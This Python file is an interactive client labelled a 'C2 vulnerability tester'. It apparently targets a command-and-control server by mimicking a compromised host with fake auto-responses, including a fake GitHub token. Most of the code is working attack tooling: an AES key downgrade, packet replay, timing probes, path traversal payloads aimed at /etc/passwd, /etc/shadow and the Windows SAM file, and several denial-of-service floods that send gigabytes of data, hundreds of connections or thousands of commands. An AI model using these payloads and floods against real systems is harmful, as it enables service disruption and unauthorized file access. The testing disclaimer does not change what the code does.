import socket, struct, os, threading, queue, sys, time, hashlib, base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter

SERVER_HOST="localhost"
SERVER_PORT=9949

RESET="\033[0m"
GREEN="\033[32m"
CYAN="\033[36m"
GRAY="\033[90m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[34m"
MAGENTA="\033[35m"
BOLD="\033[1m"

SAVE_MODE="--save" in sys.argv

LAST_SERVER=""
AUTO_SENT=set()

AUTO_RESPONSES={
"ls":"token",
"cat token":"GitHub; werthertrfq234rtgfdsqwerfgasdfgtrewdfg12345yjbvca",
"pwd":"/root",
"whoami":"root",
".PUT_FILE":"success",
"GET_HOSTNAME":"Parrot-OS",
".HEARTBEAT":"HEARTBEAT_ACK",
"GET_CWD":"/root/",
"GET_CAPABILITIES":"zlib",
}
tx_queue=queue.Queue()
rx_id=0
tx_id=0
rx_buffer={}
tx_buffer={}

# Global variables for exploits
sock_global = None
aes_global = None
server_pubkey = None
captured_packets = []

# For scheduled commands
scheduled_tasks = []
stop_scheduled = threading.Event()

COMMANDS=[
"help","show","set","clear","exit","save","for",
"exploit","replay","mitm","inject","downgrade",
"timing","compression","enumerate","dos",
"heartbeat-flood","screenshot-recover","info","stress","stop"
]

# ================================================
# CORE FUNCTIONS
# ================================================

def recvall(sock,n):
    data=b''
    while len(data)<n:
        part=sock.recv(n-len(data))
        if not part:
            raise ConnectionError
        data+=part
    return data

def send_worker(sock,aes):
    global tx_id
    while True:
        msg=tx_queue.get()
        raw=msg.encode()

        tx_id+=1
        my_id=tx_id

        if SAVE_MODE:
            tx_buffer[my_id]=raw

        nonce=os.urandom(12)
        ct=aes.encrypt(nonce,raw,None)
        packet=b"\x00"+nonce+ct

        # Capture for replay attacks
        captured_packets.append({
            'id': my_id,
            'nonce': nonce,
            'ciphertext': ct,
            'plaintext': raw,
            'timestamp': time.time()
        })

        full_packet = struct.pack(">I",len(packet))+packet
        sock.sendall(full_packet)

        print(f"{GRAY}[TX #{my_id}] nonce={nonce.hex()[:16]}... bytes={len(packet)}{RESET}")

def process_auto(text, msg_id):
    global LAST_SERVER
    if msg_id in AUTO_SENT:
        return
    AUTO_SENT.add(msg_id)

    text = text.strip()
    LAST_SERVER = text

    for k,v in AUTO_RESPONSES.items():
        if not k.startswith(".") and text==k:
            print(f"{YELLOW}[AUTO exact]{RESET} → {v}")
            tx_queue.put(v)
            return

    for k,v in AUTO_RESPONSES.items():
        if k.startswith(".") and k[1:] in text:
            print(f"{YELLOW}[AUTO substring]{RESET} → {v}")
            tx_queue.put(v)
            return

    if LAST_SERVER:
        response = f"/bin/sh: 1: {LAST_SERVER}: not found"
        print(f"{YELLOW}[AUTO default]{RESET} → {response}")
        tx_queue.put(response)

def recv_loop(sock,aes):
    global rx_id
    while True:
        try:
            size=struct.unpack(">I",recvall(sock,4))[0]
            data=recvall(sock,size)

            nonce=data[1:13]
            ct=data[13:]

            rx_id+=1
            my_id=rx_id

            print(f"{GRAY}[RX #{my_id}] size={size} nonce={nonce.hex()[:16]}...{RESET}")

            text=aes.decrypt(nonce,ct,None)

            if SAVE_MODE:
                rx_buffer[my_id]=text

            try:
                decoded=text.decode(errors="replace")
            except:
                decoded=str(text)

            if decoded=="HEARTBEAT":
                print(f"{BLUE}[HEARTBEAT]{RESET}")

            print(f"{GREEN}[SERVER]{RESET} {decoded}")

            process_auto(decoded, my_id)

        except:
            print(f"{RED}[!] Disconnected{RESET}")
            os._exit(0)

def handshake(sock):
    global server_pubkey
    banner=sock.recv(1024)
    print(f"{CYAN}[BANNER]{RESET} {banner.decode().strip()}")

    print(f"{YELLOW}[CLIENT] REQUEST_PUBKEY{RESET}")
    sock.sendall(b"REQUEST_PUBKEY")

    data=sock.recv(8192)
    pem=data[len(b"PUBKEY:"):]
    server_pubkey = pem

    print(f"\n{CYAN}--- RSA PUBLIC KEY ---{RESET}")
    print(pem.decode()[:200] + "...")
    print(f"{CYAN}---------------------{RESET}\n")

    pub=serialization.load_pem_public_key(pem)
    aes_key=os.urandom(32)

    enc=pub.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    sock.sendall(struct.pack(">I",len(enc))+enc)

    print(f"{YELLOW}[AES KEY]{RESET} {aes_key.hex()}")
    print(f"{GREEN}--- SECURE CHANNEL ESTABLISHED ---{RESET}\n")

    return AESGCM(aes_key), aes_key

# ================================================
# SCHEDULED TASKS
# ================================================

def scheduled_command_worker():
    """Worker thread que ejecuta comandos programados"""
    global stop_scheduled
    while not stop_scheduled.is_set():
        current_time = time.time()
        for task in scheduled_tasks[:]:  # Copy to avoid modification during iteration
            if current_time >= task['next_run']:
                print(f"{MAGENTA}[SCHEDULED] Ejecutando: {task['command']}{RESET}")
                tx_queue.put(task['command'])
                task['next_run'] = current_time + task['interval']
                task['count'] += 1
        time.sleep(1)  # Check every second

def start_scheduled_command(command, interval):
    """Inicia un comando programado"""
    task = {
        'command': command,
        'interval': interval,
        'next_run': time.time() + interval,
        'count': 0
    }
    scheduled_tasks.append(task)
    print(f"{GREEN}[+] Comando programado: '{command}' cada {interval}s{RESET}")

def stop_all_scheduled():
    """Detiene todos los comandos programados"""
    scheduled_tasks.clear()
    print(f"{YELLOW}[!] Todos los comandos programados detenidos{RESET}")

def show_scheduled():
    """Muestra los comandos programados activos"""
    if not scheduled_tasks:
        print(f"{YELLOW}[!] No hay comandos programados{RESET}")
        return
    
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{BOLD}{CYAN}COMANDOS PROGRAMADOS{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"{BOLD}{'COMANDO':<30} {'INTERVALO':<15} {'EJECUTADOS':<15}{RESET}")
    print(f"{CYAN}{'-'*70}{RESET}")
    
    for task in scheduled_tasks:
        next_in = int(task['next_run'] - time.time())
        print(f"{task['command']:<30} {task['interval']:>10}s  {task['count']:>10}x  (próximo en {next_in}s)")
    
    print(f"{CYAN}{'='*70}{RESET}\n")

# ================================================
# STRESS TEST FUNCTIONS (GB LEVEL)
# ================================================

def stress_test_bandwidth(size_gb=1, chunk_mb=10):
    """
    Test de estrés de ancho de banda - envía datos masivos
    size_gb: Tamaño total a enviar en GB
    chunk_mb: Tamaño de cada chunk en MB
    """
    print(f"\n{BOLD}{RED}[STRESS TEST] Bandwidth Overload - {size_gb} GB{RESET}")
    print(f"{YELLOW}Description: Send massive data to saturate server bandwidth{RESET}")
    
    chunk_size = chunk_mb * 1024 * 1024  # Convert MB to bytes
    total_bytes = int(size_gb * 1024 * 1024 * 1024)  # Convert GB to bytes
    chunks_needed = total_bytes // chunk_size
    
    print(f"{CYAN}[*] Total size: {size_gb} GB ({total_bytes:,} bytes){RESET}")
    print(f"{CYAN}[*] Chunk size: {chunk_mb} MB ({chunk_size:,} bytes){RESET}")
    print(f"{CYAN}[*] Total chunks: {chunks_needed:,}{RESET}")
    print(f"{YELLOW}[!] This will take several minutes...{RESET}\n")
    
    start_time = time.time()
    sent_bytes = 0
    
    try:
        for i in range(chunks_needed):
            # Generate random data chunk
            chunk = os.urandom(chunk_size)
            
            nonce = os.urandom(12)
            ct = aes_global.encrypt(nonce, chunk, None)
            packet = b"\x00" + nonce + ct
            full_packet = struct.pack(">I", len(packet)) + packet
            
            sock_global.sendall(full_packet)
            sent_bytes += len(chunk)
            
            # Progress update every 100 chunks
            if (i + 1) % 100 == 0:
                elapsed = time.time() - start_time
                speed_mbps = (sent_bytes / elapsed) / (1024 * 1024)
                progress = (sent_bytes / total_bytes) * 100
                print(f"{GREEN}[{progress:.1f}%] Enviados: {sent_bytes/(1024*1024*1024):.2f} GB | Velocidad: {speed_mbps:.2f} MB/s{RESET}")
        
        elapsed = time.time() - start_time
        avg_speed = (sent_bytes / elapsed) / (1024 * 1024)
        
        print(f"\n{GREEN}[+] Stress test completado!{RESET}")
        print(f"{CYAN}[*] Total enviado: {sent_bytes/(1024*1024*1024):.2f} GB{RESET}")
        print(f"{CYAN}[*] Tiempo total: {elapsed:.2f} segundos{RESET}")
        print(f"{CYAN}[*] Velocidad promedio: {avg_speed:.2f} MB/s{RESET}")
        
    except Exception as e:
        print(f"{RED}[-] Stress test failed: {e}{RESET}")
        print(f"{YELLOW}[*] Datos enviados antes del fallo: {sent_bytes/(1024*1024):.2f} MB{RESET}")

def stress_test_connections(num_connections=100):
    """
    Test de estrés de conexiones - abre múltiples conexiones simultáneas
    """
    print(f"\n{BOLD}{RED}[STRESS TEST] Connection Flood - {num_connections} conexiones{RESET}")
    print(f"{YELLOW}Description: Open multiple simultaneous connections to exhaust resources{RESET}")
    
    connections = []
    successful = 0
    
    print(f"{CYAN}[*] Intentando abrir {num_connections} conexiones...{RESET}")
    
    for i in range(num_connections):
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((SERVER_HOST, SERVER_PORT))
            connections.append(s)
            successful += 1
            
            if (i + 1) % 10 == 0:
                print(f"{GREEN}[+] Conexiones abiertas: {successful}/{i+1}{RESET}")
                
        except Exception as e:
            print(f"{RED}[-] Fallo en conexión {i+1}: {e}{RESET}")
    
    print(f"\n{GREEN}[+] Test completado!{RESET}")
    print(f"{CYAN}[*] Conexiones exitosas: {successful}/{num_connections}{RESET}")
    print(f"{YELLOW}[*] Manteniendo conexiones abiertas por 30 segundos...{RESET}")
    
    time.sleep(30)
    
    print(f"{YELLOW}[*] Cerrando conexiones...{RESET}")
    for s in connections:
        try:
            s.close()
        except:
            pass
    
    print(f"{GREEN}[+] Todas las conexiones cerradas{RESET}")

def stress_test_rapid_fire(commands_per_sec=1000, duration_sec=60):
    """
    Test de estrés de comandos rápidos
    """
    print(f"\n{BOLD}{RED}[STRESS TEST] Rapid Fire - {commands_per_sec} cmd/s por {duration_sec}s{RESET}")
    print(f"{YELLOW}Description: Send commands at extreme rate{RESET}")
    
    delay = 1.0 / commands_per_sec
    total_commands = commands_per_sec * duration_sec
    
    print(f"{CYAN}[*] Delay entre comandos: {delay*1000:.2f} ms{RESET}")
    print(f"{CYAN}[*] Total de comandos: {total_commands:,}{RESET}")
    print(f"{YELLOW}[!] Iniciando en 3 segundos...{RESET}\n")
    
    time.sleep(3)
    
    start_time = time.time()
    sent = 0
    
    try:
        while time.time() - start_time < duration_sec:
            tx_queue.put(f"test_command_{sent}")
            sent += 1
            time.sleep(delay)
            
            if sent % 1000 == 0:
                elapsed = time.time() - start_time
                rate = sent / elapsed
                print(f"{GREEN}[{elapsed:.1f}s] Enviados: {sent:,} | Rate: {rate:.0f} cmd/s{RESET}")
        
        elapsed = time.time() - start_time
        rate = sent / elapsed
        
        print(f"\n{GREEN}[+] Stress test completado!{RESET}")
        print(f"{CYAN}[*] Total enviado: {sent:,} comandos{RESET}")
        print(f"{CYAN}[*] Tiempo total: {elapsed:.2f} segundos{RESET}")
        print(f"{CYAN}[*] Rate promedio: {rate:.2f} cmd/s{RESET}")
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Test interrumpido por usuario{RESET}")
        print(f"{CYAN}[*] Comandos enviados: {sent:,}{RESET}")

def stress_test_memory(packet_size_mb=100, num_packets=100):
    """
    Test de estrés de memoria - envía paquetes muy grandes
    """
    print(f"\n{BOLD}{RED}[STRESS TEST] Memory Exhaustion - {num_packets} paquetes de {packet_size_mb} MB{RESET}")
    print(f"{YELLOW}Description: Send huge packets to exhaust server memory{RESET}")
    
    packet_size = packet_size_mb * 1024 * 1024
    total_size_gb = (packet_size * num_packets) / (1024 * 1024 * 1024)
    
    print(f"{CYAN}[*] Tamaño por paquete: {packet_size_mb} MB{RESET}")
    print(f"{CYAN}[*] Total de paquetes: {num_packets}{RESET}")
    print(f"{CYAN}[*] Tamaño total: {total_size_gb:.2f} GB{RESET}")
    print(f"{YELLOW}[!] Iniciando...{RESET}\n")
    
    start_time = time.time()
    
    try:
        for i in range(num_packets):
            # Generate huge packet
            data = os.urandom(packet_size)
            
            nonce = os.urandom(12)
            ct = aes_global.encrypt(nonce, data, None)
            packet = b"\x00" + nonce + ct
            full_packet = struct.pack(">I", len(packet)) + packet
            
            sock_global.sendall(full_packet)
            
            print(f"{GREEN}[{i+1}/{num_packets}] Paquete enviado ({packet_size_mb} MB){RESET}")
            time.sleep(0.1)  # Small delay to avoid overwhelming
        
        elapsed = time.time() - start_time
        
        print(f"\n{GREEN}[+] Stress test completado!{RESET}")
        print(f"{CYAN}[*] Total enviado: {total_size_gb:.2f} GB{RESET}")
        print(f"{CYAN}[*] Tiempo total: {elapsed:.2f} segundos{RESET}")
        
    except Exception as e:
        print(f"{RED}[-] Stress test failed: {e}{RESET}")

# ================================================
# EXPLOIT FUNCTIONS
# ================================================

def exploit_downgrade_crypto():
    """
    CVE: Weak AES Key Downgrade Attack
    Send 128-bit AES instead of 256-bit
    """
    print(f"\n{BOLD}{RED}[EXPLOIT] Downgrade Cryptographic Attack{RESET}")
    print(f"{YELLOW}Description: Force server to accept weaker 128-bit AES encryption{RESET}")

    try:
        s = socket.socket()
        s.connect((SERVER_HOST, SERVER_PORT))

        banner = s.recv(1024)
        s.sendall(b"REQUEST_PUBKEY")
        data = s.recv(8192)
        pem = data[len(b"PUBKEY:"):]
        pub = serialization.load_pem_public_key(pem)

        # Use weak 128-bit key instead of 256-bit
        weak_aes = os.urandom(16)  # 128 bits

        enc = pub.encrypt(
            weak_aes,
            padding.OAEP(
                mgf=padding.MGF1(hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        s.sendall(struct.pack(">I", len(enc)) + enc)

        print(f"{GREEN}[+] Weak AES-128 key sent: {weak_aes.hex()}{RESET}")
        print(f"{GREEN}[+] Server accepted downgraded encryption!{RESET}")
        print(f"{YELLOW}[!] Connection now vulnerable to faster brute-force attacks{RESET}")

        # Mantener conexión para demostrar que funciona
        time.sleep(2)
        s.close()

    except Exception as e:
        print(f"{RED}[-] Exploit failed: {e}{RESET}")

def exploit_replay_attack(packet_id=None):
    """
    CVE: Replay Attack - No Message Sequence Validation
    Replay previously captured encrypted packets
    """
    print(f"\n{BOLD}{RED}[EXPLOIT] Replay Attack{RESET}")
    print(f"{YELLOW}Description: Resend captured encrypted packets{RESET}")

    if not captured_packets:
        print(f"{RED}[-] No packets captured. Send some commands first.{RESET}")
        return

    if packet_id:
        packets = [p for p in captured_packets if p['id'] == packet_id]
    else:
        packets = captured_packets[-30:]  # Last 30 packets

    if not packets:
        print(f"{RED}[-] Packet ID {packet_id} not found{RESET}")
        return

    print(f"{CYAN}[*] Replaying {len(packets)} packet(s)...{RESET}")

    for pkt in packets:
        try:
            nonce = pkt['nonce']
            ct = pkt['ciphertext']
            packet = b"\x00" + nonce + ct
            full_packet = struct.pack(">I", len(packet)) + packet

            sock_global.sendall(full_packet)

            print(f"{GREEN}[+] Replayed packet #{pkt['id']}: {pkt['plaintext'][:50].decode(errors='ignore')}...{RESET}")
            time.sleep(0.1)

        except Exception as e:
            print(f"{RED}[-] Failed to replay packet #{pkt['id']}: {e}{RESET}")

def exploit_timing_attack():
    """
    CVE: Timing Side-Channel Information Disclosure
    """
    print(f"\n{BOLD}{RED}[EXPLOIT] Timing Side-Channel Attack{RESET}")
    print(f"{YELLOW}Description: Measure response times to infer information{RESET}")

    test_commands = [
        ("whoami", "Valid command"),
        ("nonexistent_cmd_xyz", "Invalid command"),
        ("cat /etc/passwd", "Sensitive file"),
        ("sleep 2", "Delay command"),
    ]

    print(f"{CYAN}[*] Measuring response times...{RESET}\n")

    for cmd, desc in test_commands:
        start = time.time()
        tx_queue.put(cmd)
        time.sleep(2)  # Wait for response
        elapsed = time.time() - start

        print(f"{BLUE}[TIMING] {desc:<25} Command: {cmd:<30} Time: {elapsed:.3f}s{RESET}")

    print(f"\n{GREEN}[+] Timing attack completed{RESET}")
    print(f"{YELLOW}[!] Analyze time differences to detect validation patterns{RESET}")

def exploit_dos_memory():
    """
    CVE: Memory Exhaustion DoS
    """
    print(f"\n{BOLD}{RED}[EXPLOIT] Memory Exhaustion DoS{RESET}")
    print(f"{YELLOW}Description: Exhaust server memory with large payloads{RESET}")

    print(f"{CYAN}[*] Sending memory-intensive payloads...{RESET}\n")

    for i in range(50):
        # 10 MB payload
        payload = "A" * (10 * 1024 * 1024)
        try:
            nonce = os.urandom(12)
            ct = aes_global.encrypt(nonce, payload.encode(), None)
            packet = b"\x00" + nonce + ct
            full_packet = struct.pack(">I", len(packet)) + packet

            sock_global.sendall(full_packet)

            print(f"{GREEN}[{i+1}/50] Sent 10 MB payload{RESET}")
            time.sleep(0.2)

        except Exception as e:
            print(f"{RED}[-] Failed at iteration {i+1}: {e}{RESET}")
            break

    print(f"\n{GREEN}[+] DoS attack completed{RESET}")

def exploit_path_traversal():
    """
    CVE: Directory Traversal Attack
    """
    print(f"\n{BOLD}{RED}[EXPLOIT] Path Traversal Attack{RESET}")
    print(f"{YELLOW}Description: Access files outside allowed directories{RESET}")

    payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/shadow",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]

    print(f"{CYAN}[*] Testing {len(payloads)} path traversal payloads...{RESET}\n")

    for i, payload in enumerate(payloads, 1):
        cmd = f"GET_FILE:{payload}"
        print(f"{BLUE}[{i}] {cmd}{RESET}")
        tx_queue.put(cmd)
        time.sleep(0.3)

    print(f"\n{GREEN}[+] Path traversal attack completed{RESET}")

def exploit_heartbeat_flood():
    """
    CVE: Heartbeat Spoofing Flood
    """
    print(f"\n{BOLD}{RED}[EXPLOIT] Heartbeat Spoofing Flood{RESET}")
    print(f"{YELLOW}Description: Flood server with fake heartbeat packets{RESET}")

    print(f"{CYAN}[*] Sending 1000 heartbeat packets...{RESET}\n")

    for i in range(1000):
        tx_queue.put("HEARTBEAT")

        if (i + 1) % 100 == 0:
            print(f"{GREEN}[+] Sent {i+1} heartbeats{RESET}")

    print(f"\n{GREEN}[+] Heartbeat flood completed{RESET}")

def exploit_info_gathering():
    """
    Information gathering about the server
    """
    print(f"\n{BOLD}{CYAN}[INFO] System Information Gathering{RESET}")
    print(f"{YELLOW}Description: Collect information about the target system{RESET}\n")

    commands = [
        ("GET_HOSTNAME", "Hostname"),
        ("GET_CWD", "Current directory"),
        ("GET_CAPABILITIES", "Server capabilities"),
        ("whoami", "Current user"),
        ("pwd", "Working directory"),
        ("ls", "Directory listing"),
    ]

    for cmd, desc in commands:
        print(f"{CYAN}[*] {desc}...{RESET}")
        tx_queue.put(cmd)
        time.sleep(0.5)

    print(f"\n{GREEN}[+] Information gathering completed{RESET}")

def show_rules():
    print(f"\n{CYAN}{'='*60}{RESET}")
    print(f"{BOLD}{CYAN}AUTO-RESPONSE RULES{RESET}")
    print(f"{CYAN}{'='*60}{RESET}")
    print(f"{BOLD}{'KEY':<30} {'VALUE':<30}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")

    for k, v in AUTO_RESPONSES.items():
        match_type = "substring" if k.startswith(".") else "exact"
        display_key = k[1:] if k.startswith(".") else k
        print(f"{YELLOW}{display_key:<30}{RESET} {v[:30]:<30} {GRAY}[{match_type}]{RESET}")

    print(f"{CYAN}{'='*60}{RESET}\n")

def clear_terminal():
    os.system("clear" if os.name != "nt" else "cls")

def show_help():
    help_text = f"""
{BOLD}{CYAN}╔════════════════════════════════════════════════════════════╗
║           BLACKBERRY C2 VULNERABILITY TESTER              ║
║                    Security Research Tool                  ║
╚════════════════════════════════════════════════════════════╝{RESET}

{BOLD}{GREEN}BASIC COMMANDS{RESET}
help                    Show this help menu
show                    Display auto-response rules
set <key>=<val>         Set auto-response rule (exact match)
set .<key>=<val>        Set auto-response rule (substring)
clear                   Clear terminal
exit                    Exit the client
info                    Gather system information

{BOLD}{MAGENTA}SCHEDULED COMMANDS{RESET}
for <cmd> sends <N>s    Execute command every N seconds
for show                Show active scheduled commands
stop                    Stop all scheduled commands

{BOLD}{RED}EXPLOIT COMMANDS{RESET}
exploit list            List all available exploits
downgrade               Cryptographic downgrade attack (AES-128)
replay [id]             Replay captured packet(s)
timing                  Timing side-channel attack
dos                     Memory exhaustion DoS
heartbeat-flood         Heartbeat spoofing flood

{BOLD}{YELLOW}STRESS TEST COMMANDS{RESET}
stress bandwidth <GB>   Send massive data (GB level)
stress connections <N>  Open N simultaneous connections
stress rapid <N> <S>    Send N commands/sec for S seconds
stress memory <MB> <N>  Send N packets of MB size each
"""
    
    if SAVE_MODE:
        help_text += f"""
{BOLD}{BLUE}SAVE MODE{RESET} (active with --save)
save <id>               Save single packet by ID
save <id1,id2,id3>      Save multiple packets
save 1-10               Save range of packets
save 1-10 file.bin      Save to specific file
save 1-3,5-7 -/         Save groups to separate files
"""
    
    help_text += f"""
{BOLD}{BLUE}PACKET TRACKING{RESET}
Every sent/received packet gets an incremental ID
TX = Transmitted (sent by client)
RX = Received (from server)

{BOLD}{YELLOW}EXAMPLES{RESET}
# Set custom auto-response
set whoami=admin

# Execute command every 160 seconds
for whoami sends 160s

# Stress test bandwidth - send 5 GB
stress bandwidth 5

# Stress test with 500 connections
stress connections 500

# Show scheduled commands
for show

# Stop all scheduled commands
stop

{BOLD}{RED}WARNING{RESET}
{YELLOW}This tool is for authorized security testing only.
Unauthorized access to computer systems is illegal.{RESET}

{CYAN}{'═'*60}{RESET}
"""
    print(help_text)

def list_exploits():
    exploits = [
        ("downgrade", "Cryptographic Downgrade Attack", "HIGH"),
        ("replay", "Replay Attack", "MEDIUM"),
        ("timing", "Timing Side-Channel", "MEDIUM"),
        ("dos", "Memory Exhaustion DoS", "HIGH"),
        ("heartbeat-flood", "Heartbeat Flood", "LOW"),
        ("stress bandwidth", "Bandwidth Saturation (GB)", "CRITICAL"),
        ("stress connections", "Connection Exhaustion", "HIGH"),
        ("stress rapid", "Rapid Fire Attack", "HIGH"),
        ("stress memory", "Memory Bomb Attack", "CRITICAL"),
    ]

    print(f"\n{BOLD}{CYAN}{'='*70}{RESET}")
    print(f"{BOLD}{CYAN}AVAILABLE EXPLOITS{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"{BOLD}{'COMMAND':<25} {'DESCRIPTION':<30} {'SEVERITY':<15}{RESET}") 
    print(f"{CYAN}{'-'*70}{RESET}")

    for cmd, desc, sev in exploits:
        color = RED if sev == "CRITICAL" else YELLOW if sev == "HIGH" else BLUE 
        print(f"{CYAN}{cmd:<25}{RESET} {desc:<30} {color}{sev:<15}{RESET}")

    print(f"{CYAN}{'='*70}{RESET}\n")

def parse_ids(s):
    result=[]
    for part in s.split(","):
        if "-" in part:
            start,end=map(int,part.split("-"))
            result.extend(range(start,end+1))
        else:
            result.append(int(part))
    return result

def save_chunks(cmd):
    if not SAVE_MODE:
        print(f"{RED}[-] Run with --save to enable capture{RESET}")
        return

    parts = cmd.split()
    if len(parts) < 2:
        print(f"{RED}Usage: save <id(s)> [file.bin] [-/]{RESET}")
        return

    multi_files = "-/" in cmd
    ids_str = parts[1].split("-/") if multi_files else [parts[1]]

    for idx, group in enumerate(ids_str):
        try:
            ids = parse_ids(group)
        except ValueError:
            print(f"{RED}[-] Invalid ID format: {group}{RESET}")
            continue

        if len(parts) >= 3 and not multi_files:
            name = parts[2]
        else:
            name = f"chunk_{ids[0]}.bin" if multi_files else "chunk_all.bin"

        if multi_files:
            name = f"chunk_group{idx+1}.bin"

        with open(name, "wb") as f:
            for i in ids:
                if i in rx_buffer:
                    f.write(rx_buffer[i])
                elif i in tx_buffer:
                    f.write(tx_buffer[i])
                else:
                    print(f"{RED}[-] Missing ID {i}{RESET}")

        print(f"{GREEN}[+] Saved → {name}{RESET}")

# ================================================
# MAIN
# ================================================

def main():
    global sock_global, aes_global

    print(f"{BOLD}{RED}")
    print(r"""
██████╗ ██╗      █████╗  ██████╗██╗  ██╗██████╗ ███████╗██████╗ ██████╗ ██╗   ██╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
██████╔╝██║     ███████║██║     █████╔╝ ██████╔╝█████╗  ██████╔╝██████╔╝ ╚████╔╝
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══██╗██╔══╝  ██╔══██╗██╔══██╗  ╚██╔╝ 
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██████╔╝███████╗██║  ██║██║  ██║   ██║
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
""")
    print(f"{RESET}{CYAN}           Vulnerability Testing Client - For Authorized Testing Only{RESET}\n")

    s = socket.socket()
    try:
        print(f"{YELLOW}[*] Connecting to {SERVER_HOST}:{SERVER_PORT}...{RESET}")
        s.connect((SERVER_HOST, SERVER_PORT))
        print(f"{GREEN}[+] Connected!{RESET}\n")
    except Exception as e:
        print(f"{RED}[-] Connection failed: {e}{RESET}")
        return

    sock_global = s
    aes, aes_key = handshake(s)
    aes_global = aes

    threading.Thread(target=send_worker, args=(s, aes), daemon=True).start()
    threading.Thread(target=recv_loop, args=(s, aes), daemon=True).start()
    threading.Thread(target=scheduled_command_worker, daemon=True).start()

    session = PromptSession(
        completer=WordCompleter(COMMANDS, ignore_case=True)
    )

    print(f"{CYAN}Type 'help' for available commands{RESET}\n")

    while True:
        try:
            cmd = session.prompt(f"BBClient> ").strip()
            if not cmd:
                continue

            # Basic commands
            if cmd == "help":
                show_help()
                continue

            if cmd == "show":
                show_rules()
                continue

            if cmd == "clear":
                clear_terminal()
                continue

            if cmd == "exit":
                print(f"{YELLOW}[!] Exiting...{RESET}")
                os._exit(0)

            if cmd == "info":
                exploit_info_gathering()
                continue

            # Scheduled commands
            if cmd.startswith("for "):
                if "sends" in cmd:
                    try:
                        # Parse: for <command> sends <N>s
                        parts = cmd.split(" sends ")
                        if len(parts) == 2:
                            command = parts[0][4:].strip()  # Remove "for "
                            interval_str = parts[1].strip()
                            if interval_str.endswith('s'):
                                interval = int(interval_str[:-1])
                                start_scheduled_command(command, interval)
                            else:
                                print(f"{RED}[-] Formato inválido. Usa: for <comando> sends <N>s{RESET}")
                        else:
                            print(f"{RED}[-] Formato inválido. Usa: for <comando> sends <N>s{RESET}")
                    except ValueError:
                        print(f"{RED}[-] Intervalo inválido{RESET}")
                elif "show" in cmd:
                    show_scheduled()
                else:
                    print(f"{RED}[-] Comando 'for' inválido. Usa: for <comando> sends <N>s{RESET}")
                continue

            if cmd == "stop":
                stop_all_scheduled()
                continue

            # Stress test commands
            if cmd.startswith("stress bandwidth"):
                parts = cmd.split()
                size_gb = float(parts[2]) if len(parts) > 2 else 1
                stress_test_bandwidth(size_gb)
                continue

            if cmd.startswith("stress connections"):
                parts = cmd.split()
                num_conn = int(parts[2]) if len(parts) > 2 else 100
                stress_test_connections(num_conn)
                continue

            if cmd.startswith("stress rapid"):
                parts = cmd.split()
                rate = int(parts[2]) if len(parts) > 2 else 1000
                duration = int(parts[3]) if len(parts) > 3 else 60
                stress_test_rapid_fire(rate, duration)
                continue

            if cmd.startswith("stress memory"):
                parts = cmd.split()
                size_mb = int(parts[2]) if len(parts) > 2 else 100
                num = int(parts[3]) if len(parts) > 3 else 100
                stress_test_memory(size_mb, num)
                continue

            # Exploit commands
            if cmd in ["exploit", "exploit list"]:
                list_exploits()
                continue

            if cmd == "downgrade":
                exploit_downgrade_crypto()
                continue

            if cmd.startswith("replay"):
                parts = cmd.split()
                packet_id = int(parts[1]) if len(parts) > 1 else None
                exploit_replay_attack(packet_id)
                continue

            if cmd == "timing":
                exploit_timing_attack()
                continue

            if cmd == "dos":
                exploit_dos_memory()
                continue

            if cmd == "heartbeat-flood":
                exploit_heartbeat_flood()
                continue

            # Save commands
            if cmd.startswith("save "):
                save_chunks(cmd)
                continue

            # Set commands
            if cmd.startswith("set "):
                pair = cmd[4:].strip()
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    AUTO_RESPONSES[k.strip()] = v.strip()
                    print(f"{GREEN}[+] Rule set:{RESET} {k} => {v}")
                continue

            # Send as normal command
            tx_queue.put(cmd)

        except KeyboardInterrupt:
            print(f"\n{RED}Use 'exit' to quit{RESET}")
        except Exception as e:
            print(f"{RED}[-] Error: {e}{RESET}")

if __name__ == "__main__":
    main()